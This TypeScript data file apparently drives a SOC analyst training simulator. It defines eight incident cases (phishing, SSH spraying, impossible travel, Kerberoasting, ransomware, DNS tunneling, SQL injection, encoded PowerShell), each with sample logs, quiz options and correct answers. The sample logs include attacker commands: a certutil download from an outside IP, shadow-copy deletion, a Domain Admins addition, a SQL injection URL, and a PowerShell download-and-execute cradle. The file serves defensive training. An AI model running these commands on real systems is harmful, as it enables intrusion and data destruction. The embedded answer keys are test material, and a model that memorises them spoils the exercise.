import { SocIncidentCase } from '../types/socSimulator';

export const SOC_INCIDENTS_FULL: SocIncidentCase[] = [
  // 1. Phishing Investigation
  {
    id: 'inc-phishing-1',
    title: 'Spear-Phishing Attachment & Macro Execution',
    category: 'Phishing',
    severity: 'High',
    mitreId: 'T1566.001',
    summary: 'EDR detected excel.exe launching cmd.exe after opening an email attachment named "Q3_Invoice_Overdue.xlsm" on WS-FINANCE-04.',
    detectedAt: '2026-08-22T08:14:22Z',
    points: 200,
    xpReward: 250,
    logs: [
      {
        id: 'l1',
        timestamp: '2026-08-22T08:12:05Z',
        logType: 'WEB_ACCESS',
        sourceIp: '198.51.100.44',
        message: 'Inbound email from billing-alert@corp-invoice-update.com delivered to m.scott@corp.local with attachment Q3_Invoice_Overdue.xlsm'
      },
      {
        id: 'l2',
        timestamp: '2026-08-22T08:14:10Z',
        logType: 'SYSMON',
        process: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
        commandLine: 'EXCEL.EXE "C:\\Users\\m.scott\\Downloads\\Q3_Invoice_Overdue.xlsm"',
        fileHash: 'SHA256: 8f9b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b',
        message: 'Process EXCEL.EXE created child process cmd.exe'
      },
      {
        id: 'l3',
        timestamp: '2026-08-22T08:14:22Z',
        logType: 'SYSMON',
        process: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c certutil.exe -urlcache -f http://185.220.101.99/stage2.exe C:\\Users\\Public\\stage2.exe',
        message: 'Certutil downloading suspicious secondary executable'
      }
    ],
    options: {
      attackTypes: ['Spear-Phishing Attachment', 'Password Spray', 'SQL Injection', 'Ransomware Outbreak'],
      initialAccessVectors: ['T1566.001 Spearphishing Attachment', 'T1190 Exploit Public-Facing Application', 'T1078 Valid Accounts', 'T1133 External Remote Services'],
      affectedAccounts: ['m.scott@corp.local', 'j.doe@corp.local', 'admin@corp.local', 'service_acc'],
      affectedSystems: ['WS-FINANCE-04', 'AUTH-SRV-01', 'DC-PRIMARY-01', 'WEB-PORTAL-02'],
      timelines: [
        '08:12 Email Delivered -> 08:14 Excel Opened Macro -> 08:14 Certutil Stage2 Download',
        '08:14 Certutil Executed -> 08:15 Email Received -> 08:20 User Logged Out',
        '08:00 Admin Login -> 08:12 Macro Downloaded -> 08:30 System Rebooted'
      ],
      iocs: ['185.220.101.99 / Q3_Invoice_Overdue.xlsm', '10.0.0.1 / clean.pdf', '192.168.1.1 / auth.log', '172.16.0.4 / safe.exe'],
      recommendedResponses: [
        'Isolate WS-FINANCE-04 from network, block IP 185.220.101.99 on Firewall, revoke m.scott credentials & purge malicious email',
        'Reboot system, clear browser cookies, inform user',
        'Ignore alert as false positive',
        'Format Domain Controller'
      ]
    },
    correctAnswers: {
      attackType: 'Spear-Phishing Attachment',
      initialAccess: 'T1566.001 Spearphishing Attachment',
      affectedAccount: 'm.scott@corp.local',
      affectedSystem: 'WS-FINANCE-04',
      timeline: '08:12 Email Delivered -> 08:14 Excel Opened Macro -> 08:14 Certutil Stage2 Download',
      ioc: '185.220.101.99 / Q3_Invoice_Overdue.xlsm',
      recommendedResponse: 'Isolate WS-FINANCE-04 from network, block IP 185.220.101.99 on Firewall, revoke m.scott credentials & purge malicious email'
    },
    nistRemediation: 'NIST SP 800-61 Rev 2: Containment via host network isolation, IP/domain perimeter blocking, credential reset, and email gateway attachment purging.',
    officialSourceIds: ['nist_csf', 'mitre_attack']
  },

  // 2. Brute Force Investigation
  {
    id: 'inc-bruteforce-1',
    title: 'SSH Password Spraying & Failed Auth Spike',
    category: 'Brute Force',
    severity: 'High',
    mitreId: 'T1110.003',
    summary: 'SIEM triggered a critical alert after 4,500 failed SSH authentication attempts targeted AUTH-SRV-01 within 3 minutes.',
    detectedAt: '2026-08-22T09:30:00Z',
    points: 180,
    xpReward: 220,
    logs: [
      {
        id: 'l4',
        timestamp: '2026-08-22T09:27:01Z',
        logType: 'FIREWALL',
        sourceIp: '185.220.101.5',
        destinationIp: '192.168.10.15',
        message: 'Inbound TCP port 22 connection request accepted from 185.220.101.5'
      },
      {
        id: 'l5',
        timestamp: '2026-08-22T09:28:15Z',
        logType: 'AUTH',
        sourceIp: '185.220.101.5',
        message: 'Failed password for invalid user admin from 185.220.101.5 port 44102 ssh2'
      },
      {
        id: 'l6',
        timestamp: '2026-08-22T09:29:40Z',
        logType: 'AUTH',
        sourceIp: '185.220.101.5',
        message: 'Accepted password for sysadmin from 185.220.101.5 port 45110 ssh2'
      }
    ],
    options: {
      attackTypes: ['Brute Force / Password Spray', 'Phishing', 'Buffer Overflow', 'XSS'],
      initialAccessVectors: ['T1110.003 Password Spraying', 'T1566 Phishing', 'T1190 Web Exploit', 'T1200 Supply Chain'],
      affectedAccounts: ['sysadmin', 'root', 'm.scott', 'guest'],
      affectedSystems: ['AUTH-SRV-01', 'WS-FINANCE-04', 'DB-CLUSTER-09', 'MAIL-SRV-01'],
      timelines: [
        '09:27 Inbound TCP 22 -> 09:28 4,500 Failed Auth Attempts -> 09:29 Successful Login sysadmin',
        '09:00 Successful Login -> 09:27 Password Spraying -> 09:30 Log Out',
        '09:28 Email Received -> 09:29 SSH Connection -> 09:30 Disconnect'
      ],
      iocs: ['185.220.101.5 / sysadmin account compromise', '10.0.0.1 / clean log', '127.0.0.1 / localhost', '192.168.1.1 / router'],
      recommendedResponses: [
        'Block attacker IP 185.220.101.5 on firewall, kill active sysadmin SSH session, force password reset & enforce SSH key-only MFA',
        'Do nothing, SSH password sprays are normal',
        'Restart server only',
        'Disable SSH permanently'
      ]
    },
    correctAnswers: {
      attackType: 'Brute Force / Password Spray',
      initialAccess: 'T1110.003 Password Spraying',
      affectedAccount: 'sysadmin',
      affectedSystem: 'AUTH-SRV-01',
      timeline: '09:27 Inbound TCP 22 -> 09:28 4,500 Failed Auth Attempts -> 09:29 Successful Login sysadmin',
      ioc: '185.220.101.5 / sysadmin account compromise',
      recommendedResponse: 'Block attacker IP 185.220.101.5 on firewall, kill active sysadmin SSH session, force password reset & enforce SSH key-only MFA'
    },
    nistRemediation: 'NIST SP 800-61: Immediate session termination, IP ban via fail2ban/firewall, mandatory MFA deployment, and root credential rotation.',
    officialSourceIds: ['nist_csf', 'mitre_attack', 'cisa']
  },

  // 3. Suspicious Login
  {
    id: 'inc-login-1',
    title: 'Impossible Travel & Geolocation Anomaly',
    category: 'Suspicious Login',
    severity: 'Medium',
    mitreId: 'T1078',
    summary: 'Cloud Identity Provider flagged a login for executive_ceo@corp.local from Frankfurt 10 minutes after a legitimate login in New York.',
    detectedAt: '2026-08-22T10:45:00Z',
    points: 150,
    xpReward: 180,
    logs: [
      {
        id: 'l7',
        timestamp: '2026-08-22T10:30:00Z',
        logType: 'AUTH',
        sourceIp: '198.51.100.10 (New York, US)',
        message: 'Successful Azure AD Login for executive_ceo@corp.local via Trusted Corporate Device'
      },
      {
        id: 'l8',
        timestamp: '2026-08-22T10:40:12Z',
        logType: 'AUTH',
        sourceIp: '103.251.140.22 (Frankfurt, DE)',
        message: 'Successful Azure AD Login for executive_ceo@corp.local via Untrusted Linux Browser'
      }
    ],
    options: {
      attackTypes: ['Suspicious Login / Account Takeover', 'DDOS Attack', 'SQL Injection', 'Ransomware'],
      initialAccessVectors: ['T1078 Valid Accounts', 'T1190 Public Application', 'T1566 Phishing', 'T1200 Supply Chain'],
      affectedAccounts: ['executive_ceo@corp.local', 'dev_john', 'billing@corp', 'sysadmin'],
      affectedSystems: ['CLOUD-AZURE-IDP', 'WS-FINANCE-04', 'AUTH-SRV-01', 'DB-01'],
      timelines: [
        '10:30 Valid Login NY -> 10:40 Impossible Travel Login Frankfurt (10 min gap)',
        '10:40 Frankfurt Login -> 10:50 NY Login -> 11:00 Logout',
        '10:00 Email Received -> 10:30 Login'
      ],
      iocs: ['103.251.140.22 / executive_ceo@corp.local', '198.51.100.10 / safe', '127.0.0.1 / local', '10.0.0.5 / internal'],
      recommendedResponses: [
        'Revoke active Azure AD OAuth tokens for executive_ceo, enforce mandatory FIDO2 MFA re-authentication, and inspect cloud audit logs',
        'Ignore since user was executive CEO',
        'Delete executive account',
        'Shut down corporate WiFi'
      ]
    },
    correctAnswers: {
      attackType: 'Suspicious Login / Account Takeover',
      initialAccess: 'T1078 Valid Accounts',
      affectedAccount: 'executive_ceo@corp.local',
      affectedSystem: 'CLOUD-AZURE-IDP',
      timeline: '10:30 Valid Login NY -> 10:40 Impossible Travel Login Frankfurt (10 min gap)',
      ioc: '103.251.140.22 / executive_ceo@corp.local',
      recommendedResponse: 'Revoke active Azure AD OAuth tokens for executive_ceo, enforce mandatory FIDO2 MFA re-authentication, and inspect cloud audit logs'
    },
    nistRemediation: 'NIST CSF PR.AC-7: Implement adaptive risk-based conditional access policies and token revocation.',
    officialSourceIds: ['nist_csf', 'cisa']
  },

  // 4. Account Compromise
  {
    id: 'inc-compromise-1',
    title: 'Kerberoasting Ticket Theft & Admin Escalation',
    category: 'Account Compromise',
    severity: 'Critical',
    mitreId: 'T1558.003',
    summary: 'Active Directory Domain Controller detected high volume TGS-REQ Kerberos ticket requests targeting MSSQL Service Principal Names (SPN).',
    detectedAt: '2026-08-22T11:15:00Z',
    points: 250,
    xpReward: 300,
    logs: [
      {
        id: 'l9',
        timestamp: '2026-08-22T11:10:00Z',
        logType: 'AUTH',
        sourceIp: '192.168.5.42 (WS-DEV-12)',
        message: 'Event 4769: A Kerberos service ticket was requested for SPN MSSQLSvc/db-prod.corp.local:1433 by user d.miller'
      },
      {
        id: 'l10',
        timestamp: '2026-08-22T11:14:30Z',
        logType: 'SYSMON',
        process: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'net group "Domain Admins" d.miller /add /domain',
        message: 'Event 4728: A member was added to a security-enabled global group (Domain Admins)'
      }
    ],
    options: {
      attackTypes: ['Kerberoasting & Privilege Escalation', 'Phishing', 'Buffer Overflow', 'DNS Tunneling'],
      initialAccessVectors: ['T1558.003 Kerberoasting', 'T1566 Phishing', 'T1190 Web Exploit', 'T1078 Valid Accounts'],
      affectedAccounts: ['d.miller', 'm.scott', 'sysadmin', 'guest'],
      affectedSystems: ['DC-PRIMARY-01', 'WS-DEV-12', 'AUTH-SRV-01', 'MAIL-SRV-01'],
      timelines: [
        '11:10 TGS Kerberos Ticket Request for SPN -> 11:14 User d.miller Added to Domain Admins',
        '11:14 Group Added -> 11:15 Ticket Requested -> 11:20 Reboot',
        '11:00 User Login -> 11:30 Ticket Expiration'
      ],
      iocs: ['SPN MSSQLSvc ticket extraction / d.miller escalation', '10.0.0.1 / clean', '192.168.1.1 / router', '127.0.0.1 / local'],
      recommendedResponses: [
        'Remove d.miller from Domain Admins, disable account d.miller, rotate krbtgt password twice, and reset MSSQL service account password with 25+ char complexity',
        'Restart Domain Controller',
        'Allow user to stay in Domain Admins',
        'Uninstall Active Directory'
      ]
    },
    correctAnswers: {
      attackType: 'Kerberoasting & Privilege Escalation',
      initialAccess: 'T1558.003 Kerberoasting',
      affectedAccount: 'd.miller',
      affectedSystem: 'DC-PRIMARY-01',
      timeline: '11:10 TGS Kerberos Ticket Request for SPN -> 11:14 User d.miller Added to Domain Admins',
      ioc: 'SPN MSSQLSvc ticket extraction / d.miller escalation',
      recommendedResponse: 'Remove d.miller from Domain Admins, disable account d.miller, rotate krbtgt password twice, and reset MSSQL service account password with 25+ char complexity'
    },
    nistRemediation: 'NIST SP 800-61 / MITRE ATT&CK Mitigation M1015: Enforce Group Managed Service Accounts (gMSA) and double reset of krbtgt account hash.',
    officialSourceIds: ['mitre_attack', 'cisa', 'cwe']
  },

  // 5. Malware Alert Simulation
  {
    id: 'inc-malware-1',
    title: 'Ransomware Binary Execution Attempt',
    category: 'Malware Alert',
    severity: 'Critical',
    mitreId: 'T1486',
    summary: 'EDR blocked execution of WannaCry ransomware variant on WORKSTATION-91 after detecting file encryption signatures.',
    detectedAt: '2026-08-22T13:00:00Z',
    points: 250,
    xpReward: 300,
    logs: [
      {
        id: 'l11',
        timestamp: '2026-08-22T12:59:01Z',
        logType: 'SYSMON',
        process: 'C:\\Users\\p.sharma\\AppData\\Local\\Temp\\wcry.exe',
        fileHash: 'SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        message: 'EDR Action: Process Execution BLOCKED. Ransomware Heuristic Signature Matched: WNCRY_RANSOMWARE'
      },
      {
        id: 'l12',
        timestamp: '2026-08-22T12:59:05Z',
        logType: 'SYSMON',
        process: 'C:\\Windows\\System32\\vssadmin.exe',
        commandLine: 'vssadmin.exe Delete Shadows /All /Quiet',
        message: 'EDR Action: Process Terminated. Attempted shadow copy deletion'
      }
    ],
    options: {
      attackTypes: ['Ransomware Execution Attempt', 'Phishing', 'SQL Injection', 'Password Spray'],
      initialAccessVectors: ['T1486 Data Encrypted for Impact', 'T1566 Phishing', 'T1190 Public Application', 'T1078 Valid Accounts'],
      affectedAccounts: ['p.sharma', 'm.scott', 'sysadmin', 'guest'],
      affectedSystems: ['WORKSTATION-91', 'AUTH-SRV-01', 'DC-PRIMARY-01', 'DB-01'],
      timelines: [
        '12:59 wcry.exe Executed -> 12:59 vssadmin Delete Shadows Attempted -> 12:59 EDR Blocked & Terminated',
        '12:00 EDR Installed -> 12:59 User Logout -> 13:00 Reboot',
        '12:59 Backup Created -> 13:00 System Restored'
      ],
      iocs: ['SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 / wcry.exe', '10.0.0.1 / clean', '127.0.0.1 / local', '192.168.1.1 / router'],
      recommendedResponses: [
        'Isolate WORKSTATION-91 from network, perform full forensic memory image, scrub Temp directory, and verify VSS shadow backups',
        'Ignore because EDR blocked it',
        'Pay ransom',
        'Reboot workstation'
      ]
    },
    correctAnswers: {
      attackType: 'Ransomware Execution Attempt',
      initialAccess: 'T1486 Data Encrypted for Impact',
      affectedAccount: 'p.sharma',
      affectedSystem: 'WORKSTATION-91',
      timeline: '12:59 wcry.exe Executed -> 12:59 vssadmin Delete Shadows Attempted -> 12:59 EDR Blocked & Terminated',
      ioc: 'SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 / wcry.exe',
      recommendedResponse: 'Isolate WORKSTATION-91 from network, perform full forensic memory image, scrub Temp directory, and verify VSS shadow backups'
    },
    nistRemediation: 'NIST SP 800-61: Incident containment via host isolation, root-cause forensic analysis, and immutable backup validation.',
    officialSourceIds: ['cisa', 'mitre_attack', 'nist_csf']
  },

  // 6. Data Exfiltration Simulation
  {
    id: 'inc-exfil-1',
    title: 'DNS Tunneling & High Volume Data Exfiltration',
    category: 'Data Exfiltration',
    severity: 'High',
    mitreId: 'T1071.004',
    summary: 'Internal DNS logs detected 12,000 anomalous TXT queries carrying Base64 encoded payload chunks sent to c2-stealth.top.',
    detectedAt: '2026-08-22T14:20:00Z',
    points: 200,
    xpReward: 250,
    logs: [
      {
        id: 'l13',
        timestamp: '2026-08-22T14:15:02Z',
        logType: 'DNS',
        sourceIp: '10.0.4.88 (DB-FINANCE-01)',
        message: 'DNS Query TXT: 5a7b8c9d0e.exfil.c2-stealth.top -> Resolved 198.51.100.22'
      },
      {
        id: 'l14',
        timestamp: '2026-08-22T14:18:45Z',
        logType: 'DNS',
        sourceIp: '10.0.4.88 (DB-FINANCE-01)',
        message: 'DNS Query TXT: 9e0f1a2b3c.exfil.c2-stealth.top -> 12,450 TXT queries logged in 5 minutes (Volume: 42 MB)'
      }
    ],
    options: {
      attackTypes: ['DNS Tunneling Data Exfiltration', 'Phishing', 'Brute Force', 'Buffer Overflow'],
      initialAccessVectors: ['T1071.004 Application Layer Protocol: DNS', 'T1566 Phishing', 'T1190 Web Exploit', 'T1078 Valid Accounts'],
      affectedAccounts: ['service_db_admin', 'm.scott', 'sysadmin', 'guest'],
      affectedSystems: ['DB-FINANCE-01', 'WS-FINANCE-04', 'AUTH-SRV-01', 'MAIL-SRV-01'],
      timelines: [
        '14:15 Initial DNS TXT Query to c2-stealth.top -> 14:18 12,450 TXT Queries Exfiltrating 42MB Data',
        '14:18 DNS Query -> 14:20 Login -> 14:25 Logout',
        '14:00 System Reboot -> 14:15 Email Received'
      ],
      iocs: ['c2-stealth.top / 10.0.4.88 (42MB exfiltrated)', '10.0.0.1 / clean', '127.0.0.1 / local', '192.168.1.1 / router'],
      recommendedResponses: [
        'Block domain c2-stealth.top on DNS sinkhole, isolate DB-FINANCE-01, inspect database audit logs for stolen tables, and notify Incident Commander',
        'Allow DNS traffic to continue',
        'Restart DNS server',
        'Delete database'
      ]
    },
    correctAnswers: {
      attackType: 'DNS Tunneling Data Exfiltration',
      initialAccess: 'T1071.004 Application Layer Protocol: DNS',
      affectedAccount: 'service_db_admin',
      affectedSystem: 'DB-FINANCE-01',
      timeline: '14:15 Initial DNS TXT Query to c2-stealth.top -> 14:18 12,450 TXT Queries Exfiltrating 42MB Data',
      ioc: 'c2-stealth.top / 10.0.4.88 (42MB exfiltrated)',
      recommendedResponse: 'Block domain c2-stealth.top on DNS sinkhole, isolate DB-FINANCE-01, inspect database audit logs for stolen tables, and notify Incident Commander'
    },
    nistRemediation: 'NIST SP 800-61 / CISA Incident Response: DNS Sinkholing, perimeter payload inspection, and breach disclosure assessment.',
    officialSourceIds: ['cisa', 'mitre_attack', 'nist_csf']
  },

  // 7. Web Attack Investigation
  {
    id: 'inc-web-1',
    title: 'SQL Injection Payload & Database Extraction',
    category: 'Web Attack',
    severity: 'High',
    mitreId: 'T1190',
    summary: 'WAF alert flagged SQL injection (SQLi) union select queries targeting public web application /api/v1/products.',
    detectedAt: '2026-08-22T15:45:00Z',
    points: 180,
    xpReward: 220,
    logs: [
      {
        id: 'l15',
        timestamp: '2026-08-22T15:42:10Z',
        logType: 'WEB_ACCESS',
        sourceIp: '198.51.100.77',
        message: 'GET /api/v1/products?cat=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 200 OK (Bytes: 154,200)'
      }
    ],
    options: {
      attackTypes: ['SQL Injection (SQLi)', 'Phishing', 'DNS Tunneling', 'Brute Force'],
      initialAccessVectors: ['T1190 Exploit Public-Facing Application', 'T1566 Phishing', 'T1078 Valid Accounts', 'T1200 Supply Chain'],
      affectedAccounts: ['www-data / app_user', 'm.scott', 'sysadmin', 'guest'],
      affectedSystems: ['WEB-PORTAL-02', 'WS-FINANCE-04', 'AUTH-SRV-01', 'DC-PRIMARY-01'],
      timelines: [
        '15:42 SQLi Payload Sent -> HTTP 200 OK Returned 154KB Database Users Payload',
        '15:40 Admin Login -> 15:42 Web Request -> 15:45 Logout',
        '15:42 Email Sent -> 15:45 SQL Payload'
      ],
      iocs: ['198.51.100.77 / UNION SELECT SQLi exploit', '10.0.0.1 / clean', '127.0.0.1 / local', '192.168.1.1 / router'],
      recommendedResponses: [
        'Block IP 198.51.100.77 on WAF, deploy parameterized SQL queries (Prepared Statements) to fix CWE-89, and rotate compromised user passwords',
        'Disable public web portal permanently',
        'Ignore 200 OK response',
        'Reboot web server'
      ]
    },
    correctAnswers: {
      attackType: 'SQL Injection (SQLi)',
      initialAccess: 'T1190 Exploit Public-Facing Application',
      affectedAccount: 'www-data / app_user',
      affectedSystem: 'WEB-PORTAL-02',
      timeline: '15:42 SQLi Payload Sent -> HTTP 200 OK Returned 154KB Database Users Payload',
      ioc: '198.51.100.77 / UNION SELECT SQLi exploit',
      recommendedResponse: 'Block IP 198.51.100.77 on WAF, deploy parameterized SQL queries (Prepared Statements) to fix CWE-89, and rotate compromised user passwords'
    },
    nistRemediation: 'OWASP Top 10 A03 / CWE-89: Enforce prepared statements, input validation, WAF virtual patching, and password rotations.',
    officialSourceIds: ['owasp_top10', 'cwe', 'nist_csf']
  },

  // 8. Suspicious PowerShell Activity
  {
    id: 'inc-powershell-1',
    title: 'Encoded PowerShell Command & Memory Injection',
    category: 'PowerShell Activity',
    severity: 'Critical',
    mitreId: 'T1059.001',
    summary: 'Sysmon Event 1 detected encoded PowerShell command `-EncodedCommand aWV4(....)` executing DownloadString from remote C2 IP.',
    detectedAt: '2026-08-22T17:10:00Z',
    points: 250,
    xpReward: 300,
    logs: [
      {
        id: 'l16',
        timestamp: '2026-08-22T17:08:12Z',
        logType: 'SYSMON',
        process: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -nop -w hidden -EncodedCommand aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xLjUwL3BheWxvYWQucHMxJyk=',
        message: 'Decoded Payload: iex (new-object net.webclient).downloadstring(\'http://192.168.1.50/payload.ps1\')'
      }
    ],
    options: {
      attackTypes: ['Encoded PowerShell Command & Remote Download', 'Phishing', 'SQL Injection', 'Brute Force'],
      initialAccessVectors: ['T1059.001 PowerShell Scripting', 'T1566 Phishing', 'T1190 Web Exploit', 'T1078 Valid Accounts'],
      affectedAccounts: ['j.doe', 'm.scott', 'sysadmin', 'guest'],
      affectedSystems: ['WS-DEV-12', 'AUTH-SRV-01', 'DC-PRIMARY-01', 'DB-01'],
      timelines: [
        '17:08 Encoded PowerShell Launched -> Decoded Memory Injection from 192.168.1.50/payload.ps1',
        '17:00 Login -> 17:08 Reboot -> 17:10 Log Out',
        '17:08 Email Delivered -> 17:10 Logout'
      ],
      iocs: ['192.168.1.50/payload.ps1 / Encoded PowerShell execution', '10.0.0.1 / clean', '127.0.0.1 / local', '192.168.1.1 / router'],
      recommendedResponses: [
        'Isolate WS-DEV-12, block C2 IP 192.168.1.50, enable PowerShell Constrained Language Mode (CLM) & AMSI logging, and audit user permissions',
        'Ignore PowerShell commands',
        'Delete powershell.exe binary',
        'Reboot system'
      ]
    },
    correctAnswers: {
      attackType: 'Encoded PowerShell Command & Remote Download',
      initialAccess: 'T1059.001 PowerShell Scripting',
      affectedAccount: 'j.doe',
      affectedSystem: 'WS-DEV-12',
      timeline: '17:08 Encoded PowerShell Launched -> Decoded Memory Injection from 192.168.1.50/payload.ps1',
      ioc: '192.168.1.50/payload.ps1 / Encoded PowerShell execution',
      recommendedResponse: 'Isolate WS-DEV-12, block C2 IP 192.168.1.50, enable PowerShell Constrained Language Mode (CLM) & AMSI logging, and audit user permissions'
    },
    nistRemediation: 'NIST SP 800-61 / CISA: Enable AMSI (Antimalware Scan Interface), PowerShell CLM mode, ScriptBlock Logging (Event ID 4104), and C2 containment.',
    officialSourceIds: ['cisa', 'mitre_attack', 'nist_csf']
  }
];
